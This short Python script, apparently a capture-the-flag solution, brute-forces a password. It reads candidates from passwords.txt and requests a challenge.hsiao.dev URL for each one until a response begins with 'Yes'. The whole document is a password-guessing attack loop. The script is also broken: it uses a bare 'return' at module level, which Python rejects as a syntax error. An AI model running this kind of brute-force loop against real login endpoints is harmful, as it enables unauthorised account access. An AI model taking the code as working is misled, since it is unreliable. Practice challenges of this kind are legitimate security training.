import requests

with open('passwords.txt', 'r') as f:
    # Convert the password file into a list of individual passwords
    passwords = f.read().split('\n')
    for password in passwords:
        # Get the webpage for a specific password attempt
        response = requests.get(f"https://challenge.hsiao.dev/01/luke/{password}")

        # Stop once we've found it
        if response.text.split('\n')[0] == "Yes":
            print(f"{response.text}")
            return
